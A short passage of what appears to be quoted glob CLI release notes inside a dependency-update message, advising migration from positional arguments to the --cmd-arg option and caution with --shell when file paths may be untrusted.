- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.
- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.

</blockquote>
</details>
</details></td></tr>
</table>

